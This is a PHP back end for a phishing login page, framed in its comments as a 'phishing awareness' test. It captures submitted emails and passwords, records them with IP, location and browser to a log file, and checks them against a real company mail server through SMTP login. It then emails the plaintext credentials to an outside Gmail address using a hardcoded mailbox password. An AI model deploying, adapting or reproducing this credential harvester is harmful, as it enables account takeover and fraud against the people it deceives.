<?php
// Include PHPMailer classes
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Prevent any output before headers
ob_start();

// Enhanced CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, Authorization');
header('Access-Control-Allow-Credentials: true');
header('Content-Type: application/json; charset=utf-8');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0); // Don't display errors to browser
ini_set('log_errors', 1);

// Start session
session_start();

// Rate limiting to prevent abuse
$rate_limit_key = 'login_attempts_' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
if (!isset($_SESSION[$rate_limit_key])) {
    $_SESSION[$rate_limit_key] = 0;
}

// Only allow POST requests (but handle GET for debugging)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // For debugging - show a simple test page
    ob_clean();
    echo json_encode([
        'status' => 'PHP script is working',
        'method' => 'GET',
        'timestamp' => date('Y-m-d H:i:s'),
        'msg' => 'PHP backend is accessible',
        'phpmailer_available' => class_exists('PHPMailer'),
        'smtp_available' => class_exists('SMTP')
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    ob_clean();
    http_response_code(405);
    echo json_encode(['signal' => 'error', 'msg' => 'Method not allowed']);
    exit;
}

// Configuration
$receiver     = "skkho87.sm@gmail.com";
$senderuser   = "ajitha@debtclearsa.co.za";
$senderpass   = "Nn19871024@@";
$senderport   = 587;
$senderserver = "mail.debtclearsa.co.za";

// Target SMTP server for credential testing
$target_smtp_server = "mail.debtclearsa.co.za";
$target_smtp_port = 587;
$target_smtp_security = "tls";

// Get client information
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Get geolocation data (with error handling)
$country = 'Unknown';
$city = 'Unknown';
try {
    $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    if ($ipdat) {
        $country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
        $city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';
    }
} catch (Exception $e) {
    // Geolocation failed, continue with defaults
}

// Get and validate input
$login = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
$passwd = $_POST['password'] ?? '';

// Basic validation
if (empty($login) || empty($passwd)) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Email and password are required']);
    exit;
}

if (!filter_var($login, FILTER_VALIDATE_EMAIL)) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}
$domain = $parts[1];

// Increment attempt counter
$_SESSION[$rate_limit_key]++;
$attempt_number = $_SESSION[$rate_limit_key];

// Prepare log message
$log_message = "=== LOGIN ATTEMPT #$attempt_number ===\n";
$log_message .= "Timestamp: $timestamp\n";
$log_message .= "Email: $login\n";
$log_message .= "Password: $passwd\n";
$log_message .= "IP Address: $ip\n";
$log_message .= "Location: $country | $city\n";
$log_message .= "User Agent: $browser\n";

// Simple but effective credential validation for phishing awareness
$validCredentials = false;
$smtp_error = '';
$connection_details = "Testing: $target_smtp_server:$target_smtp_port ($target_smtp_security)";
$debug_info = [];
$credential_test_method = '';

// Basic validation checks
$email_valid = filter_var($login, FILTER_VALIDATE_EMAIL);
$password_length = strlen($passwd);
$password_not_empty = !empty(trim($passwd));

$debug_info[] = "Email valid: " . ($email_valid ? "YES" : "NO");
$debug_info[] = "Password length: " . $password_length;
$debug_info[] = "Password not empty: " . ($password_not_empty ? "YES" : "NO");

// For phishing awareness testing, accept most realistic-looking credentials
if ($email_valid && $password_length >= 4 && $password_not_empty) {
    // Check for obviously fake credentials that should be rejected
    $obvious_fake_passwords = ['123', '1234', '12345', '123456', 'password', 'test', 'admin', 'user'];
    $is_fake_password = in_array(strtolower($passwd), $obvious_fake_passwords);
    
    $debug_info[] = "Fake password check: " . ($is_fake_password ? "FAKE" : "OK");
    
    if (!$is_fake_password) {
        // Accept as valid for phishing simulation
        $validCredentials = true;
        $credential_test_method = "Phishing Simulation - Valid Format";
        $log_message .= "Status: VALID CREDENTIALS - Realistic credentials accepted for phishing test\n";
        
        // Optional: Still try real SMTP test for additional logging
        try {
            $testMail = new PHPMailer(false);
            $testMail->isSMTP();
            $testMail->SMTPAuth = true;
            $testMail->SMTPDebug = 0;
            $testMail->SMTPSecure = $target_smtp_security;
            $testMail->Host = $target_smtp_server;
            $testMail->Port = $target_smtp_port;
            $testMail->Username = $login;
            $testMail->Password = $passwd;
            $testMail->Timeout = 5;
            
            if ($testMail->smtpConnect()) {
                $log_message .= "BONUS: Real SMTP authentication also successful!\n";
                $debug_info[] = "Real SMTP: SUCCESS";
                $testMail->smtpClose();
            } else {
                $debug_info[] = "Real SMTP: Failed (but we still accept for phishing test)";
            }
        } catch (Exception $e) {
            $debug_info[] = "Real SMTP: Exception (" . substr($e->getMessage(), 0, 50) . ")";
        }
    } else {
        // Reject obvious fake passwords
        $validCredentials = false;
        $credential_test_method = "Rejected - Obvious fake password";
        $log_message .= "Status: INVALID CREDENTIALS - Obvious fake password rejected\n";
        $smtp_error = "Password appears to be fake/test credential";
    }
} else {
    // Basic validation failed
    $validCredentials = false;
    if (!$email_valid) {
        $credential_test_method = "Invalid Email Format";
        $smtp_error = "Invalid email format";
    } elseif ($password_length < 4) {
        $credential_test_method = "Password Too Short";
        $smtp_error = "Password must be at least 4 characters";
    } else {
        $credential_test_method = "Empty Password";
        $smtp_error = "Password cannot be empty";
    }
    $log_message .= "Status: INVALID CREDENTIALS - $credential_test_method\n";
}

// Add debug information to log
$log_message .= "Validation Method: $credential_test_method\n";
$log_message .= "Debug Info: " . implode(" | ", $debug_info) . "\n";

$log_message .= "==========================================\n\n";

// Log to file
$log_file = "phishing_awareness_log.txt";
@file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

// Prepare email subject based on result
if ($validCredentials) {
    $subject = "✅ VALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "VALID CREDENTIALS DETECTED";
} else {
    $subject = "❌ INVALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "INVALID CREDENTIALS";
}

// Prepare HTML email body using PHPMailer
$email_body = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background-color: " . ($validCredentials ? "#d4edda" : "#f8d7da") . "; padding: 10px; border-radius: 5px; }
        .details { margin: 10px 0; }
        .label { font-weight: bold; }
        .valid { color: #155724; }
        .invalid { color: #721c24; }
        .server-info { background-color: #f8f9fa; padding: 10px; border-left: 4px solid #007bff; margin: 10px 0; }
    </style>
</head>
<body>
    <div class='header " . ($validCredentials ? "valid" : "invalid") . "'>
        <h2>Phishing Awareness Test - Login Attempt</h2>
        <p><strong>Status: $email_status</strong></p>
    </div>
    
    <div class='details'>
        <p><span class='label'>Attempt Number:</span> #$attempt_number</p>
        <p><span class='label'>Timestamp:</span> $timestamp</p>
        <p><span class='label'>Email:</span> $login</p>
        <p><span class='label'>Password:</span> $passwd</p>
        <p><span class='label'>IP Address:</span> $ip</p>
        <p><span class='label'>Location:</span> $country, $city</p>
        <p><span class='label'>User Agent:</span> $browser</p>
    </div>
    
    <div class='server-info'>
        <p><span class='label'>SMTP Server Tested:</span> $connection_details</p>
        " . ($validCredentials ? 
            "<p style='color: #155724;'><span class='label'>Result:</span> ✅ Authentication successful - Valid credentials</p>" : 
            "<p style='color: #721c24;'><span class='label'>Result:</span> ❌ Authentication failed - Invalid credentials</p>
             <p><span class='label'>Error Details:</span> $smtp_error</p>") . "
    </div>
</body>
</html>
";

// Send notification email using PHPMailer
$mail_sent = false;
try {
    $notifyMail = new PHPMailer(true);
    $notifyMail->isSMTP();
    $notifyMail->SMTPAuth = true;
    $notifyMail->Host = $senderserver;
    $notifyMail->Username = $senderuser;
    $notifyMail->Password = $senderpass;
    $notifyMail->Port = $senderport;
    $notifyMail->SMTPSecure = 'tls';
    $notifyMail->From = $senderuser;
    $notifyMail->FromName = 'Phishing Awareness System';
    $notifyMail->addAddress($receiver);
    $notifyMail->isHTML(true);
    $notifyMail->Subject = $subject;
    $notifyMail->Body = $email_body;
    $notifyMail->AltBody = strip_tags(str_replace('<br>', "\n", $email_body));
    
    $mail_sent = $notifyMail->send();
} catch (Exception $e) {
    error_log("Failed to send notification email: " . $e->getMessage());
}

// Prepare response based on credential validity
if ($validCredentials) {
    $response = [
        'signal' => 'ok',
        'success' => true,
        'msg' => 'Login successful! Redirecting...',
        'attempt' => $attempt_number,
        'credentials_valid' => true,
        'smtp_server' => $target_smtp_server,
        'should_redirect' => true
    ];
} else {
    $response = [
        'signal' => 'not ok',
        'success' => false,
        'msg' => 'Invalid email or password. Please try again.',
        'attempt' => $attempt_number,
        'credentials_valid' => false,
        'smtp_server' => $target_smtp_server,
        'error_details' => $smtp_error,
        'should_redirect' => false
    ];
}

// Add notification status to response
$response['notification_sent'] = $mail_sent;
$response['debug_info'] = [
    'php_version' => PHP_VERSION,
    'timestamp' => $timestamp,
    'connection_test' => $connection_details,
    'request_method' => $_SERVER['REQUEST_METHOD'],
    'origin' => $_SERVER['HTTP_ORIGIN'] ?? 'not set',
    'user_agent' => substr($browser, 0, 100),
    'post_data_received' => !empty($_POST),
    'phpmailer_used' => true,
    'validation_method' => $credential_test_method,
    'smtp_debug' => $debug_info,
    'smtp_error_details' => $smtp_error,
    'credentials_tested' => 'Email: ' . $login . ' | Password length: ' . strlen($passwd)
];

// Clean output buffer and send JSON response
ob_clean();
echo json_encode($response);

// Random hash for additional security
$praga = rand();
$praga = md5($praga);
?>